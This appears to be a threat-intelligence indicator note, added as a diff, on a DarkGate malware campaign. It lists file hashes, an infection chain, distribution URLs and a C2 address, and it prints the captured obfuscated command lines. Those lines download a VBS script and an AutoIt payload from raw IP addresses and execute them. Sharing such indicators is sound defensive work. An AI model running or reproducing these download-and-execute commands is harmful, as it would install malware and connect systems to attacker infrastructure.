@@ -1,0 +1,34 @@
+27.09.2023 | Darkgate | 
+
+*************************************************
+
+.url https://evomart.com.bd/tvp/
+.zip 72549b57edccef3a16821cd2b6f27587ed35eab6155cb165b69918a6d3450852 pw = 341
+.vbs 643c85416ff830ae12c09960d837f39e2605cab1dc4dbdcf5de3ea383b5e27cc
+.au3 be4d6328dc8defbe4598a313d11777ef97f07a186cb601e941c59ea9f76661a0
+.exe 4b67e4cea7a978c9a6a73d6217d2d55ee7d6ce3c2b5e6e6a4f59b5e5deb5a4e2
+
+*************************************************
+
+zip > lnk > vbs > au3 > exe
+
+cmd.exe /c ByI || eCho ByI & PiNG ByI || curL http://84.246.85.138/xNn/ys -o C:\Users\Admin\AppData\Local\Temp\ByI.vbs & PiNG -n 2 ByI || csCripT C:\Users\Admin\AppData\Local\Temp\ByI.vbs & exit 'jZHkwHTfHTuDpVp
+
+WScript.exe C:\Users\Admin\AppData\Local\Temp\ByI.vbs
+
+cmd.exe /c mkdir c:\wlgt & cd /d c:\wlgt & copy c:\windows\system32\curl.exe wlgt.exe & wlgt -H User-Agent: curl -o Autoit3.exe http://94.228.169.143:2351 & wlgt -o zmtwpl.au3 http://94.228.169.143:2351/msiwlgtucnm & Autoit3.exe zmtwpl.au3
+
+
+*************************************************
+
+distro urls
+
+http://84.246.85.138/xNn/ys
+http://162.19.130.45/Gdt5p3y/vWw
+http://84.246.85.121/nvT4ni/XX
+
+*************************************************
+
+c2
+
+http://94.228.169.143:2351
